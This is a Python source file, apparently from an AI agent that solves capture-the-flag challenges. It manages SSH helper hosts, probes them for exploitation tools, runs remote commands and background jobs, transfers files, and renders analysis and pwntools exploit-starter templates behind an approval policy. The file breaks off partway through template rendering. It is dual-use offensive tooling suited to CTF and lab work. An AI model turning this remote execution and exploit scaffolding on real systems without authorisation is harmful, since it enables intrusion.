import ipaddress
import json
import posixpath
import shlex
import textwrap
import traceback
from pathlib import Path
from urllib.parse import urlparse
from uuid import uuid4


class RemoteTool(object):
    DEFAULT_BASE_DIR = "/tmp/ctf-agent"
    DEFAULT_PYTHON = "python3"
    BOOTSTRAP_TEMPLATE_KINDS = {"pwn-ubuntu-bootstrap", "pwn-kali-bootstrap"}
    PWN_CORE_CAPABILITIES = ["gdb", "patchelf", "checksec", "radare2", "pwntools", "angr", "r2pipe"]
    PWN_ADVANCED_CAPABILITIES = ["gdbserver", "qemu_user", "pwninit", "one_gadget", "ropper"]
    PWN_BASE_RECOMMENDED_TEMPLATES = ["pwn-env-doctor", "binary-checksec", "pwntools-probe", "input-bruteforce-lite"]
    PWN_BUILD_CAPABILITIES = [
        "gdb",
        "gcc",
        "gxx",
        "clang",
        "make",
        "cmake",
        "nasm",
        "multilib_32",
        "musl_tools",
        "qemu_user",
        "gdb_batch",
        "corefile",
        "pwndbg_or_gef",
        "rr",
    ]
    PWN_BUILD_CORE_REQUIRED = ["gcc", "gxx", "make", "gdb"]
    PWN_BUILD_READY_REQUIRED = ["gcc", "gxx", "make", "gdb", "multilib_32", "pwndbg_or_gef", "rr"]
    UBUNTU_FAMILY_IDS = {"ubuntu", "debian", "kali", "linuxmint", "pop", "neon", "parrot", "raspbian"}
    DEFAULT_POLICY = {
        "auto_select_for_binary": True,
        "auto_select_for_web": False,
        "auto_select_for_misc": False,
        "require_public_target_for_web": True,
        "prefer_keywords": ["ubuntu"],
        "fallback_keywords": ["centos"],
        "disable_local_wsl_runner": False,
        "pwn_remote_first": True,
        "preferred_hosts_by_category": {},
    }

    def __init__(self, hosts=None, policy=None):
        self.hosts = hosts or {}
        self.policy = dict(self.DEFAULT_POLICY)
        self.policy.update(dict(policy or {}))
        self.execution_policy = None
        self.plugin_registry = None
        self.plugin_templates = []
        self.execution_context = {
            "category": "",
            "target": "",
            "background": False,
        }

    def configure_policy(self, policy=None, category="", target="", background=False):
        if policy is not None:
            self.execution_policy = policy
        self.execution_context = {
            "category": str(category or "").strip().lower(),
            "target": str(target or ""),
            "background": bool(background),
        }
        return self

    def configure_plugins(self, plugin_registry=None):
        self.plugin_registry = plugin_registry
        self.plugin_templates = list(plugin_registry.remote_templates()) if plugin_registry else []
        return self

    def _policy_blocked(self, host_name, action, exc):
        payload = exc.to_dict() if hasattr(exc, "to_dict") else {"ok": False, "reason": str(exc)}
        return {
            "status": "blocked",
            "host": host_name,
            "action": action,
            "message": payload.get("reason", str(exc)),
            "error": payload,
        }

    def _ensure_policy(self, host_name, action, background=None, category=None, target=None):
        if not self.execution_policy:
            return None
        runtime_background = self.execution_context.get("background", False) if background is None else bool(background)
        runtime_category = str(category or self.execution_context.get("category", "") or "").strip().lower()
        runtime_target = str(target or self.execution_context.get("target", "") or "")
        try:
            decision = self.execution_policy.evaluate_remote(
                host_name,
                category=runtime_category,
                target=runtime_target,
                background=runtime_background,
                operation_category="remote_subagent" if str(action or "").strip() == "remote_subagent" else "remote_exec",
            )
            if getattr(decision, "decision", "") == "deny":
                return {
                    "status": "blocked",
                    "host": host_name,
                    "action": action,
                    "message": getattr(decision, "reason", "blocked by execution policy"),
                    "error": decision.to_dict() if hasattr(decision, "to_dict") else {"reason": getattr(decision, "reason", "")},
                }
            if getattr(decision, "decision", "") == "ask":
                return {
                    "status": "needs_approval",
                    "host": host_name,
                    "action": action,
                    "message": getattr(decision, "reason", "approval required"),
                    "request_id": getattr(decision, "request_id", ""),
                    "approval": decision.to_dict() if hasattr(decision, "to_dict") else {},
                    "error": decision.to_dict() if hasattr(decision, "to_dict") else {"reason": getattr(decision, "reason", "")},
                }
        except Exception as exc:
            return self._policy_blocked(host_name, action, exc)
        return None

    def list_hosts(self):
        return sorted(self.hosts.keys())

    def describe_hosts(self):
        payload = []
        for name in self.list_hosts():
            item = dict(self.hosts.get(name, {}))
            payload.append(
                {
                    "name": name,
                    "host": item.get("host"),
                    "port": int(item.get("port", 22)),
                    "username": item.get("username"),
                    "has_password": bool(item.get("password")),
                    "has_private_key": bool(item.get("private_key")),
                    "base_dir": item.get("base_dir", self.DEFAULT_BASE_DIR),
                    "python_bin": item.get("python_bin", self.DEFAULT_PYTHON),
                    "preferred_for": list(item.get("preferred_for", [])),
                    "notes": item.get("notes", ""),
                }
            )
        return payload

    def recommend_host(self, category="", target="", preferred=None):
        requested_host = str(preferred or "").strip()
        category = str(category or "").strip().lower()
        target_summary = self._inspect_target(target)
        candidates = self._rank_candidates(category, target_summary)

        if requested_host:
            if requested_host in self.hosts:
                return {
                    "status": "ok",
                    "selection_mode": "explicit",
                    "requested_host": requested_host,
                    "selected_host": requested_host,
                    "reason": "explicit remote host requested by caller",
                    "target_summary": target_summary,
                    "candidates": candidates,
                }
            return {
                "status": "missing",
                "selection_mode": "explicit",
                "requested_host": requested_host,
                "selected_host": "",
                "reason": "requested remote host is not configured",
                "target_summary": target_summary,
                "candidates": candidates,
            }

        auto_enabled, auto_reason = self._auto_select_enabled(category, target_summary)
        if not auto_enabled:
            return {
                "status": "skipped",
                "selection_mode": "none",
                "requested_host": "",
                "selected_host": "",
                "reason": auto_reason,
                "target_summary": target_summary,
                "candidates": candidates,
            }

        if not candidates:
            return {
                "status": "missing",
                "selection_mode": "automatic",
                "requested_host": "",
                "selected_host": "",
                "reason": "no remote helper hosts are configured",
                "target_summary": target_summary,
                "candidates": [],
            }

        selected = candidates[0]
        reason = "; ".join(selected.get("reasons", [])) or "best ranked helper host"
        return {
            "status": "ok",
            "selection_mode": "automatic",
            "requested_host": "",
            "selected_host": selected.get("name", ""),
            "reason": "automatic selection for {0}: {1}".format(category or "unknown", reason),
            "target_summary": target_summary,
            "candidates": candidates,
        }

    def probe(self, host_name, timeout=20):
        host = self.hosts.get(host_name)
        if not host:
            return self._missing_host(host_name)

        client = None
        try:
            client = self._connect(host_name, timeout=timeout)
            commands = {
                "whoami": "whoami",
                "hostname": "hostname",
                "pwd": "pwd",
                "uname": "uname -a",
                "python_bin": "command -v {0} || command -v python || true".format(shlex.quote(self._python_bin(host))),
                "python_version": "{0} --version || python --version || true".format(shlex.quote(self._python_bin(host))),
            }
            steps = {}
            status = "ok"
            for name, command in commands.items():
                result = self._exec(client, command, timeout=timeout, host_name=host_name)
                steps[name] = result
                if result.get("status") not in {"ok", "error"}:
                    status = result.get("status", status)
                elif result.get("status") == "error" and name in {"whoami", "hostname"}:
                    status = "error"

            payload = {
                "status": status,
                "host": host_name,
                "target": host.get("host"),
                "base_dir": host.get("base_dir", self.DEFAULT_BASE_DIR),
                "python_bin": self._extract_first_line(steps.get("python_bin", {}).get("stdout")) or host.get("python_bin", self.DEFAULT_PYTHON),
                "username": self._extract_first_line(steps.get("whoami", {}).get("stdout")) or host.get("username"),
                "hostname": self._extract_first_line(steps.get("hostname", {}).get("stdout")),
                "cwd": self._extract_first_line(steps.get("pwd", {}).get("stdout")),
                "uname": self._extract_first_line(steps.get("uname", {}).get("stdout")),
                "python_version": self._extract_first_line(steps.get("python_version", {}).get("stdout")),
                "steps": steps,
            }
            payload["pwn_capabilities"] = self._probe_pwn_capabilities(
                client,
                host_name=host_name,
                python_bin=payload["python_bin"],
                timeout=min(float(timeout), 12.0),
            )
            if status == "error":
                payload["message"] = "remote probe returned one or more critical errors"
            return payload
        except Exception as exc:
            return self._error_payload(host_name, message=str(exc), trace=traceback.format_exc())
        finally:
            self._close(client)

    def _build_pwn_host_profile(self, host_details, host_name=""):
        host_details = dict(host_details or {})
        os_id = str(host_details.get("os_id") or "").strip().lower()
        os_like = str(host_details.get("os_like") or "").strip().lower()
        apt_get_path = str(host_details.get("apt_get") or "").strip()
        profile = {
            "host_name": str(host_name or "").strip().lower(),
            "os_id": os_id,
            "os_like": os_like,
            "apt_get": bool(apt_get_path),
            "apt_get_path": apt_get_path,
        }
        profile["apt_compatible"] = self._is_apt_compatible_host(profile)
        profile["kali_like"] = self._is_kali_like_host(profile)
        return profile

    def _is_apt_compatible_host(self, host_profile):
        host_profile = dict(host_profile or {})
        if host_profile.get("apt_get"):
            return True
        os_id = str(host_profile.get("os_id") or "").strip().lower()
        os_like_tokens = {
            token.strip().lower()
            for token in str(host_profile.get("os_like") or "").replace(",", " ").split()
            if token.strip()
        }
        if os_id in self.UBUNTU_FAMILY_IDS:
            return True
        return bool(os_like_tokens.intersection(self.UBUNTU_FAMILY_IDS))

    def _is_kali_like_host(self, host_profile):
        host_profile = dict(host_profile or {})
        host_name = str(host_profile.get("host_name") or "").strip().lower()
        os_id = str(host_profile.get("os_id") or "").strip().lower()
        os_like_tokens = {
            token.strip().lower()
            for token in str(host_profile.get("os_like") or "").replace(",", " ").split()
            if token.strip()
        }
        if "kali" in host_name:
            return True
        if os_id in {"kali", "parrot"}:
            return True
        return bool(os_like_tokens.intersection({"kali", "parrot"}))

    def _suggest_bootstrap_template(self, host_profile):
        host_profile = dict(host_profile or {})
        if not host_profile.get("apt_compatible"):
            return ""
        if self._is_kali_like_host(host_profile):
            return "pwn-kali-bootstrap"
        return "pwn-ubuntu-bootstrap"

    def _build_pwn_recommended_templates(self, matrix):
        matrix = dict(matrix or {})
        recommended_templates = list(self.PWN_BASE_RECOMMENDED_TEMPLATES)
        if matrix.get("gdbserver"):
            recommended_templates.append("pwn-gdbserver-launch")
        if matrix.get("qemu_user"):
            recommended_templates.append("pwn-qemu-run")
        if matrix.get("libc_patch_tooling"):
            recommended_templates.append("pwn-libc-setup")
        if matrix.get("pwninit"):
            recommended_templates.append("pwninit-bootstrap")
        if matrix.get("one_gadget"):
            recommended_templates.append("one-gadget-check")
        if matrix.get("gcc") and matrix.get("make"):
            recommended_templates.append("pwn-build-native")
            recommended_templates.append("pwn-libc-ident")
            recommended_templates.append("pwn-regress-build-pack")
        if matrix.get("multilib_32"):
            recommended_templates.append("pwn-build-multilib")
        if matrix.get("rr"):
            recommended_templates.append("pwn-rr-record")
        if matrix.get("gdb_batch"):
            recommended_templates.append("pwn-gdb-batch-trace")
        if matrix.get("corefile"):
            recommended_templates.append("pwn-corefile-collect")
        return list(dict.fromkeys([item for item in recommended_templates if item]))

    def _finalize_build_capabilities(self, payload):
        build_capabilities = {name: bool(payload.get(name)) for name in self.PWN_BUILD_CAPABILITIES}
        pwn_profile = str(payload.get("parity_profile") or "weak")
        core_missing = [name for name in self.PWN_BUILD_CORE_REQUIRED if not (build_capabilities.get(name) or payload.get(name))]
        ready_missing = [name for name in self.PWN_BUILD_READY_REQUIRED if not (build_capabilities.get(name) or payload.get(name))]
        optional_missing = [
            name
            for name in ["clang", "cmake", "nasm", "musl_tools", "qemu_user", "corefile"]
            if not build_capabilities.get(name)
        ]
        if pwn_profile == "weak" or core_missing:
            build_profile = "weak"
        elif ready_missing:
            build_profile = "usable"
        else:
            build_profile = "ready"
        build_recommended = ready_missing + [name for name in optional_missing if name not in ready_missing]
        suggested_build_template = "pwn-build-native"
        if build_profile == "weak" and payload.get("host_profile", {}).get("apt_compatible"):
            suggested_build_template = self._suggest_bootstrap_template(payload.get("host_profile"))
        elif build_capabilities.get("multilib_32"):
            suggested_build_template = "pwn-build-multilib"
        payload["build_capabilities"] = build_capabilities
        payload["build_profile"] = build_profile
        payload["build_missing"] = core_missing + [name for name in ready_missing if name not in core_missing]
        payload["build_recommended"] = build_recommended
        payload["suggested_build_template"] = suggested_build_template
        return payload

    def _finalize_pwn_capabilities(self, matrix, details=None, python_bin="", host_profile=None, host_name=""):
        payload = dict(matrix or {})
        payload["pwndbg_or_gef"] = bool(payload.get("pwndbg_or_gef"))
        payload["libc_patch_tooling"] = bool(payload.get("patchelf") or payload.get("pwninit"))
        payload["details"] = dict(details or {})
        payload["python_bin"] = str(python_bin or self.DEFAULT_PYTHON).strip() or self.DEFAULT_PYTHON
        payload["host_profile"] = self._build_pwn_host_profile(host_profile, host_name=host_name)

        core_missing = [name for name in self.PWN_CORE_CAPABILITIES if not payload.get(name)]
        advanced_missing = [name for name in self.PWN_ADVANCED_CAPABILITIES if not payload.get(name)]
        debugger_missing = [] if payload.get("pwndbg_or_gef") else ["pwndbg_or_gef"]
        if core_missing:
            parity_profile = "weak"
        elif advanced_missing or debugger_missing:
            parity_profile = "usable"
        else:
            parity_profile = "ready"

        payload["missing"] = core_missing + advanced_missing
        payload["recommended_templates"] = self._build_pwn_recommended_templates(payload)
        payload["parity_profile"] = parity_profile
        payload["core_missing"] = core_missing
        payload["advanced_missing"] = advanced_missing
        payload["debugger_missing"] = debugger_missing
        self._finalize_build_capabilities(payload)
        payload["bootstrap_recommended"] = bool(
            payload["host_profile"].get("apt_compatible")
            and (parity_profile != "ready" or str(payload.get("build_profile") or "weak") != "ready")
        )
        payload["suggested_template"] = self._suggest_bootstrap_template(payload["host_profile"]) if payload.get("bootstrap_recommended") else ""
        return payload

    def _probe_pwn_capabilities(self, client, host_name, python_bin, timeout=12):
        python_bin = str(python_bin or self.DEFAULT_PYTHON).strip() or self.DEFAULT_PYTHON
        commands = {
            "gdb": "command -v gdb || true",
            "gdbserver": "command -v gdbserver || true",
            "patchelf": "command -v patchelf || true",
            "checksec": "command -v checksec || true",
            "ropper": "command -v ropper || true",
            "one_gadget": "command -v one_gadget || true",
            "pwninit": "command -v pwninit || true",
            "radare2": "command -v r2 || command -v radare2 || true",
            "tmux": "command -v tmux || true",
            "socat": "command -v socat || true",
            "qemu_user": "command -v qemu-x86_64 || command -v qemu-aarch64 || command -v qemu-arm || command -v qemu-mipsel || command -v qemu-riscv64 || true",
            "pwndbg_or_gef": "if grep -qi pwndbg ~/.gdbinit 2>/dev/null; then echo pwndbg; elif grep -qi gef ~/.gdbinit 2>/dev/null; then echo gef; fi",
            "gcc": "command -v gcc || true",
            "gxx": "command -v g++ || true",
            "clang": "command -v clang || true",
            "make": "command -v make || true",
            "cmake": "command -v cmake || true",
            "nasm": "command -v nasm || true",
            "musl_tools": "command -v musl-gcc || command -v musl-clang || true",
            "rr": "command -v rr || true",
            "multilib_32": "sh -lc 'if [ -e /usr/lib32/libc.so.6 ] || [ -e /lib32/libc.so.6 ] || dpkg-query -W -f=\"${Status}\" gcc-multilib 2>/dev/null | grep -qi \"install ok installed\"; then echo ready; fi'",
            "gdb_batch": "sh -lc 'if command -v gdb >/dev/null 2>&1; then gdb -q -batch -ex \"printf \\\"gdb-batch-ready\\\\n\\\"\" /bin/true 2>/dev/null || true; fi'",
            "corefile": "sh -lc 'value=$(ulimit -c 2>/dev/null || printf 0); if [ \"$value\" != \"0\" ] && [ -n \"$value\" ]; then printf \"%s\" \"$value\"; fi'",
        }
        host_commands = {
            "os_id": "sh -lc 'if [ -r /etc/os-release ]; then . /etc/os-release; printf \"%s\" \"$ID\"; fi'",
            "os_like": "sh -lc 'if [ -r /etc/os-release ]; then . /etc/os-release; printf \"%s\" \"$ID_LIKE\"; fi'",
            "apt_get": "command -v apt-get || true",
        }
        details = {}
        for name, command in commands.items():
            result = self._exec(client, command, timeout=timeout, host_name=host_name)
            value = self._extract_first_line(result.get("stdout")) if result.get("status") == "ok" else ""
            details[name] = {
                "available": bool(value),
                "value": value,
                "status": result.get("status", ""),
            }

        python_checks = {
            "pwntools": "{0} -c \"import pwn; print(getattr(pwn, '__version__', 'ok'))\"".format(shlex.quote(python_bin)),
            "angr": "{0} -c \"import angr; print(getattr(angr, '__version__', 'ok'))\"".format(shlex.quote(python_bin)),
            "r2pipe": "{0} -c \"import r2pipe; print(getattr(r2pipe, '__file__', 'ok'))\"".format(shlex.quote(python_bin)),
        }
        for name, command in python_checks.items():
            result = self._exec(client, command, timeout=timeout, host_name=host_name)
            value = self._extract_first_line(result.get("stdout")) if result.get("status") == "ok" else ""
            details[name] = {
                "available": bool(value),
                "value": value,
                "status": result.get("status", ""),
            }

        host_details = {}
        for name, command in host_commands.items():
            result = self._exec(client, command, timeout=timeout, host_name=host_name)
            host_details[name] = self._extract_first_line(result.get("stdout")) if result.get("status") == "ok" else ""

        matrix = {name: bool((details.get(name) or {}).get("available")) for name in details.keys()}
        matrix["pwndbg_or_gef"] = bool((details.get("pwndbg_or_gef") or {}).get("value"))
        return self._finalize_pwn_capabilities(
            matrix,
            details=details,
            python_bin=python_bin,
            host_profile=host_details,
            host_name=host_name,
        )

    def ensure_workspace(self, host_name, run_id=None, remote_dir=None, timeout=30):
        blocked = self._ensure_policy(host_name, "ensure_workspace")
        if blocked:
            return blocked
        host = self.hosts.get(host_name)
        if not host:
            return self._missing_host(host_name)

        run_slug = self._sanitize_run_id(run_id or uuid4().hex[:12])
        base_dir = self._normalize_remote_path(remote_dir or host.get("base_dir") or self.DEFAULT_BASE_DIR)
        workspace_root = posixpath.join(base_dir, "run-{0}".format(run_slug))
        input_dir = posixpath.join(workspace_root, "input")
        artifact_dir = posixpath.join(workspace_root, "artifacts")
        command = "mkdir -p {0} {1}".format(shlex.quote(input_dir), shlex.quote(artifact_dir))
        result = self.run(host_name, command, timeout=timeout)
        if result.get("status") != "ok":
            result.update(
                {
                    "workspace_root": workspace_root,
                    "input_dir": input_dir,
                    "artifact_dir": artifact_dir,
                    "run_slug": run_slug,
                }
            )
            return result
        return {
            "status": "ok",
            "host": host_name,
            "workspace_root": workspace_root,
            "input_dir": input_dir,
            "artifact_dir": artifact_dir,
            "run_slug": run_slug,
        }

    def run(self, host_name, command, timeout=30, cwd=None, env=None, background=False):
        blocked = self._ensure_policy(host_name, "run_command", background=background)
        if blocked:
            return blocked
        host = self.hosts.get(host_name)
        if not host:
            return self._missing_host(host_name)

        client = None
        try:
            client = self._connect(host_name, timeout=timeout)
            return self._exec(client, command, timeout=timeout, cwd=cwd, env=env, host_name=host_name)
        except Exception as exc:
            return self._error_payload(host_name, message=str(exc), trace=traceback.format_exc())
        finally:
            self._close(client)

    def run_command(self, host_name, command, timeout=30, cwd=None, env=None, background=False):
        return self.run(host_name, command, timeout=timeout, cwd=cwd, env=env, background=background)

    def start_background_job(self, host_name, command, timeout=30, cwd=None, env=None, job_name=""):
        wrapped = "sh -lc {0}".format(shlex.quote("{0} >/dev/null 2>&1 & echo $!".format(command)))
        result = self.run(host_name, wrapped, timeout=timeout, cwd=cwd, env=env, background=True)
        if result.get("status") != "ok":
            return result
        return {
            "status": "ok",
            "host": host_name,
            "job_id": self._extract_first_line(result.get("stdout", "")),
            "job_name": str(job_name or ""),
            "command": str(command or ""),
        }

    def query_background_job(self, host_name, job_id, timeout=10):
        job_id = str(job_id or "").strip()
        if not job_id:
            return {"status": "missing", "host": host_name, "job_id": ""}
        command = "sh -lc {0}".format(
            shlex.quote(
                "if kill -0 {0} >/dev/null 2>&1; then printf running; else printf finished; fi".format(shlex.quote(job_id))
            )
        )
        result = self.run(host_name, command, timeout=timeout)
        if result.get("status") != "ok":
            return result
        return {
            "status": "ok",
            "host": host_name,
            "job_id": job_id,
            "state": self._extract_first_line(result.get("stdout", "")) or "finished",
        }

    def cancel_background_job(self, host_name, job_id, timeout=10):
        job_id = str(job_id or "").strip()
        if not job_id:
            return {"status": "missing", "host": host_name, "job_id": ""}
        command = "sh -lc {0}".format(
            shlex.quote("kill {0} >/dev/null 2>&1 || true".format(shlex.quote(job_id)))
        )
        result = self.run(host_name, command, timeout=timeout)
        if result.get("status") != "ok":
            return result
        return {"status": "ok", "host": host_name, "job_id": job_id, "state": "cancelled"}

    def run_python(self, host_name, code, args=None, timeout=60, python_bin=None, env=None, cwd=None):
        blocked = self._ensure_policy(host_name, "run_python")
        if blocked:
            return blocked
        host = self.hosts.get(host_name)
        if not host:
            return self._missing_host(host_name)

        args = list(args or [])
        client = None
        chosen_python = python_bin or host.get("python_bin") or self.DEFAULT_PYTHON
        try:
            client = self._connect(host_name, timeout=timeout)
            result = self._exec_python(
                client,
                chosen_python,
                code,
                args=args,
                timeout=timeout,
                env=env,
                cwd=cwd,
                host_name=host_name,
            )
            if result.get("returncode") == 127 and not python_bin and chosen_python == self.DEFAULT_PYTHON:
                fallback = self._exec_python(
                    client,
                    "python",
                    code,
                    args=args,
                    timeout=timeout,
                    env=env,
                    cwd=cwd,
                    host_name=host_name,
                )
                if fallback.get("status") == "ok":
                    return fallback
            return result
        except Exception as exc:
            return self._error_payload(host_name, message=str(exc), trace=traceback.format_exc())
        finally:
            self._close(client)

    def upload(self, host_name, local_path, remote_path=None, timeout=30):
        blocked = self._ensure_policy(host_name, "upload")
        if blocked:
            return blocked
        host = self.hosts.get(host_name)
        if not host:
            return self._missing_host(host_name)

        local_path = Path(local_path)
        if not local_path.exists():
            return {
                "status": "missing",
                "message": "local file does not exist",
                "host": host_name,
                "local_path": str(local_path),
            }

        target_path = self._normalize_remote_path(
            remote_path or posixpath.join(host.get("base_dir", self.DEFAULT_BASE_DIR), "{0}_{1}".format(uuid4().hex[:8], local_path.name))
        )
        client = None
        sftp = None
        try:
            client = self._connect(host_name, timeout=timeout)
            sftp = client.open_sftp()
            self._ensure_remote_parent(sftp, target_path)
            sftp.put(str(local_path), target_path)
            return {
                "status": "ok",
                "host": host_name,
                "local_path": str(local_path),
                "remote_path": target_path,
            }
        except Exception as exc:
            return self._error_payload(
                host_name,
                local_path=str(local_path),
                remote_path=target_path,
                message=str(exc),
                trace=traceback.format_exc(),
            )
        finally:
            self._close(sftp)
            self._close(client)

    def upload_text(self, host_name, content, remote_path=None, timeout=30, encoding="utf-8"):
        blocked = self._ensure_policy(host_name, "upload_text")
        if blocked:
            return blocked
        host = self.hosts.get(host_name)
        if not host:
            return self._missing_host(host_name)

        target_path = self._normalize_remote_path(
            remote_path or posixpath.join(host.get("base_dir", self.DEFAULT_BASE_DIR), "{0}.txt".format(uuid4().hex[:12]))
        )
        payload = content.encode(encoding) if isinstance(content, str) else bytes(content)
        client = None
        sftp = None
        try:
            client = self._connect(host_name, timeout=timeout)
            sftp = client.open_sftp()
            self._ensure_remote_parent(sftp, target_path)
            with sftp.file(target_path, "wb") as handle:
                handle.write(payload)
            return {
                "status": "ok",
                "host": host_name,
                "remote_path": target_path,
                "size": len(payload),
            }
        except Exception as exc:
            return self._error_payload(
                host_name,
                remote_path=target_path,
                message=str(exc),
                trace=traceback.format_exc(),
            )
        finally:
            self._close(sftp)
            self._close(client)

    def download(self, host_name, remote_path, local_path, timeout=30):
        blocked = self._ensure_policy(host_name, "download")
        if blocked:
            return blocked
        host = self.hosts.get(host_name)
        if not host:
            return self._missing_host(host_name)

        local_path = Path(local_path)
        local_path.parent.mkdir(parents=True, exist_ok=True)
        client = None
        sftp = None
        try:
            client = self._connect(host_name, timeout=timeout)
            sftp = client.open_sftp()
            sftp.get(self._normalize_remote_path(remote_path), str(local_path))
            return {
                "status": "ok",
                "host": host_name,
                "remote_path": self._normalize_remote_path(remote_path),
                "local_path": str(local_path),
                "size": local_path.stat().st_size,
            }
        except Exception as exc:
            return self._error_payload(
                host_name,
                remote_path=self._normalize_remote_path(remote_path),
                local_path=str(local_path),
                message=str(exc),
                trace=traceback.format_exc(),
            )
        finally:
            self._close(sftp)
            self._close(client)

    def _resolve_plugin_template(self, template_kind):
        requested = str(template_kind or "").strip().lower()
        if not requested:
            return {}
        for item in list(self.plugin_templates or []):
            aliases = {
                str(item.get("name", "") or "").strip().lower(),
                str(item.get("template_kind", "") or "").strip().lower(),
            }
            aliases.update({str(alias or "").strip().lower() for alias in list(item.get("aliases", []) or []) if str(alias or "").strip()})
            if requested in aliases:
                return dict(item)
        return {}

    def _render_plugin_template(self, template, filename=None, **variables):
        template = dict(template or {})
        alias_kind = str(template.get("template_kind", "") or "").strip().lower()
        if alias_kind and alias_kind != str(template.get("name", "") or "").strip().lower():
            if alias_kind not in {
                str(template.get("name", "") or "").strip().lower(),
                str(variables.get("_requested_template_kind", "") or "").strip().lower(),
            }:
                rendered = self.render_template(alias_kind, filename=filename or template.get("filename"), **variables)
                if rendered.get("status") == "ok":
                    rendered.setdefault("plugin_name", template.get("plugin_name", ""))
                return rendered
        content = template.get("content")
        if not content:
            return {}
        args = list(template.get("args", []) or [])
        for key, value in dict(variables or {}).items():
            placeholder = "{{" + str(key) + "}}"
            if isinstance(content, str):
                content = content.replace(placeholder, str(value))
            args = [str(item).replace(placeholder, str(value)) for item in args]
        return {
            "status": "ok",
            "template_kind": str(template.get("name", "") or template.get("template_kind", "") or ""),
            "filename": filename or template.get("filename") or "plugin_template.py",
            "content": str(content),
            "summary": str(template.get("summary", "") or template.get("description", "") or "Plugin-provided remote template."),
            "executable": bool(template.get("executable", True)),
            "entrypoint": str(template.get("entrypoint", "python") or "python"),
            "args": args,
            "variables": dict(variables or {}),
            "plugin_name": template.get("plugin_name", ""),
        }

    def recommend_builtin_templates(self, category=""):
        category = str(category or "").strip().lower()
        if category == "web":
            return ["http-replay"]
        if category in {"re", "reverse"}:
            return ["binary-analysis", "reverse-runner"]
        if category == "pwn":
            return ["binary-analysis", "binary-checksec", "pwntools-probe", "input-bruteforce-lite"]
        return []

    def recommended_templates(self, category=""):
        payload = []
        seen = set()
        plugin_names = self.plugin_registry.recommended_remote_templates(category) if self.plugin_registry else []
        for item in list(self.recommend_builtin_templates(category)) + list(plugin_names):
            text = str(item or "").strip()
            if not text or text in seen:
                continue
            seen.add(text)
            payload.append(text)
        return payload

    def render_template(self, template_kind, filename=None, **variables):
        kind = str(template_kind or "").strip().lower()
        try:
            plugin_template = self._resolve_plugin_template(kind)
            if plugin_template:
                rendered = self._render_plugin_template(
                    plugin_template,
                    filename=filename,
                    _requested_template_kind=kind,
                    **variables
                )
                if rendered:
                    return rendered
            if kind == "binary-analysis":
                content = self._render_binary_analysis_template()
                sample_path = str(variables.get("sample_path") or "").strip()
                category = str(variables.get("category") or "re").strip().lower()
                binary_name = str(variables.get("binary_name") or Path(sample_path or "sample.bin").name)
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_binary_analysis.py",
                    "content": content,
                    "summary": "Structured binary triage with file/readelf/strings and sample execution.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [sample_path, category, binary_name],
                    "variables": {
                        "sample_path": sample_path,
                        "category": category,
                        "binary_name": binary_name,
                    },
                }
            if kind == "binary-checksec":
                sample_path = str(variables.get("sample_path") or "").strip()
                binary_name = str(variables.get("binary_name") or Path(sample_path or "sample.bin").name)
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_binary_checksec.py",
                    "content": self._render_binary_checksec_template(),
                    "summary": "Collect low-cost binary metadata and checksec-style protections.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [sample_path, binary_name],
                    "variables": {
                        "sample_path": sample_path,
                        "binary_name": binary_name,
                    },
                }
            if kind == "http-replay":
                spec = {
                    "url": str(variables.get("url") or "").strip(),
                    "method": str(variables.get("method") or "GET").strip().upper() or "GET",
                    "headers": dict(variables.get("headers") or {}),
                    "data": dict(variables.get("data") or {}),
                    "timeout": int(variables.get("request_timeout", 12) or 12),
                    "max_body_bytes": int(variables.get("max_body_bytes", 200000) or 200000),
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_http_replay.py",
                    "content": self._render_http_replay_template(spec),
                    "summary": "Replay one HTTP request remotely and emit a normalized JSON response summary.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [],
                    "variables": spec,
                }
            if kind == "pwntools":
                target_host = str(variables.get("target_host") or "").strip()
                target_port = int(variables.get("target_port") or 0)
                payload = {
                    "binary_name": str(variables.get("binary_name") or "chall"),
                    "sample_path": str(variables.get("sample_path") or "./chall"),
                    "target_host": target_host,
                    "target_port": target_port,
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwntools_stub.py",
                    "content": self._render_pwntools_template(payload),
                    "summary": "Pwntools starter stub for local/remote exploit development.",
                    "executable": False,
                    "entrypoint": "manual",
                    "args": [],
                    "variables": payload,
                }
            if kind == "pwntools-probe":
                target_host = str(variables.get("target_host") or "").strip()
                target_port = int(variables.get("target_port") or 0)
                payload = {
                    "binary_name": str(variables.get("binary_name") or "chall"),
                    "sample_path": str(variables.get("sample_path") or "./chall"),
                    "target_host": target_host,
                    "target_port": target_port,
                    "candidate_inputs": list(variables.get("candidate_inputs") or []),
                    "target_symbol": str(variables.get("target_symbol") or "").strip(),
                    "rop_hints": list(variables.get("rop_hints") or []),
                    "probe_summary": dict(variables.get("probe_summary") or {}),
                }
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_pwntools_probe.py",
                    "content": self._render_pwntools_probe_template(payload),
                    "summary": "Pwntools exploit starter with ret2win, offset, and remote/local probes.",
                    "executable": False,
                    "entrypoint": "manual",
                    "args": [],
                    "variables": payload,
                }
            if kind == "reverse-runner":
                sample_path = str(variables.get("sample_path") or "").strip()
                binary_name = str(variables.get("binary_name") or Path(sample_path or "sample.bin").name)
                candidate_inputs = list(variables.get("candidate_inputs") or [])
                return {
                    "status": "ok",
                    "template_kind": kind,
                    "filename": filename or "remote_reverse_runner.py",
                    "content": self._render_input_runner_template(mode="reverse"),
                    "summary": "Run a candidate-input validation loop for reverse challenges.",
                    "executable": True,
                    "entrypoint": "python",
                    "args": [sample_path, binary_name, json.dumps(candidate_inputs, ensure_ascii=False)],
                    "variables": {
                        "sample_path": sample_path,
                        "binary_name": binary_name,
                        "candidate_inputs": candidate_inputs,
                    },
                }
            if kind == "input-bruteforce-lite":
                sample_path = str(variables.get("sample_path") or "").strip()
                binary_name = str(variables.get("binary_name") or Path(sample_path or "sample.bin").name)
                candidate_inputs = list(variables.get("candidate_inputs") or [])
                payload = {
                    "sample_path": sample_path,
                    "binary_name": binary_name,
                    "candidate_inputs": candidate_inputs,
                    "target_symbol": str(variables.get("target_symbol") or "").strip(),
                    "rop_hints": list(variables.get("rop_hints") or []),
                    "probe_summary": dict(variables.get("probe_summary") or {}),
                }
